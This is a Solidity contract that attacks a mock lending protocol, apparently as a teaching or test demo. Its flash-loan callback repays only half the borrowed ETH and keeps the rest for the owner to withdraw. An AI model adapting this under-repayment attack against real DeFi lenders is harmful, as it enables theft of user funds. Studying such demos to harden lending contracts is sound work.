// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./MockLendingProtocol.sol";
import "./IFlashLoanReceiver.sol";

contract FlashLoanAttacker is IFlashLoanReceiver {
    address payable public owner;
    MockLendingProtocol public lender;
 event ProfitMade(uint256 amount);
    constructor(address payable _lender) {
        owner = payable(msg.sender);
        lender = MockLendingProtocol(_lender);
    }

    function startAttack(uint256 loanAmount) public {
        lender.provideFlashLoan(loanAmount, address(this));
    }

function execute() external payable override {
    uint256 loanAmount = msg.value;
    uint256 profit = loanAmount / 2;

    // Repay part of the loan
    payable(address(lender)).transfer(loanAmount - profit);

    // ✅ Emit event showing attacker kept ETH
    emit ProfitMade(profit);
}


    function getAttackerBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner");
        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}
